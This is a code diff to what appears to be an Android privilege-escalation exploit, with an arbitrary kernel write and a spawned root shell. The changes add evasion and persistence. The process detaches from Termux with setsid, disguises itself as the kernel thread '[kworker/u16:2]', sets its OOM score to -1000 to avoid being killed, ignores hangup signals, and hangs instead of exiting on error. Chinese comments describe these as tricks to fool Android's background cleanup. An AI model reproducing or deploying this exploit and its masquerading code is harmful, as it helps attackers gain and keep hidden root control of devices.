@@ -16,6 +16,7 @@
 #include <string.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
+#include <sys/prctl.h>
 #include <sys/stat.h>
 #include <sys/resource.h>
 #include <sys/wait.h>
@@ -31,8 +32,8 @@
 #define COLOR_DEFAULT "\033[0m"
 
 #define pr_error(fmt, ...) do { \
-        printf(COLOR_RED "[!] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
-        exit(-1); \
+        printf(COLOR_RED "[!] " COLOR_DEFAULT fmt, ##__VA_ARGS__); fflush(stdout); \
+        for(;;) sleep(3600); \
     } while (0)
 #define pr_warning(fmt, ...) do { \
         printf(COLOR_RED "[-] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
@@ -589,6 +590,7 @@ static int write_value(uint64_t target, uint64_t value) {
 
 int main(int argc, char **argv) {
   setvbuf(stdout, NULL, _IONBF, 0);
+  signal(SIGHUP, SIG_IGN);
   __orig_stdout = dup(STDOUT_FILENO);
   stage_fd = open("/data/local/tmp/ghostlock54.stage", O_WRONLY | O_CREAT | O_CLOEXEC, 0600);
   record_stage('0');
@@ -713,6 +715,7 @@ int main(int argc, char **argv) {
     
     dup2(__orig_stdout, STDOUT_FILENO);
     dup2(__orig_stdout, STDERR_FILENO);
+    signal(SIGHUP, SIG_IGN);
     execl("/system/bin/sh", "sh", (char *)NULL);
     _exit(1);
   }
@@ -786,6 +789,19 @@ int main(int argc, char **argv) {
   close(STDIN_FILENO);
   close(STDOUT_FILENO);
   close(STDERR_FILENO);
+
+  // 【防杀金牌 1：脱离 Termux 的进程组，防止划掉后台时被连坐强杀】
+  setsid();
+  
+  // 【防杀金牌 2：伪装成系统底层线程，骗过 Android 的后台清理】
+  prctl(PR_SET_NAME, "[kworker/u16:2]", 0, 0, 0);
+  
+  // 【防杀金牌 3：把 OOM 权重设为最高，内存不足时 LMK 绝不杀我】
+  int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
+  if (oom_fd >= 0) {
+      write(oom_fd, "-1000", 5);
+      close(oom_fd);
+  }
 
   for (;;) pause();
 }
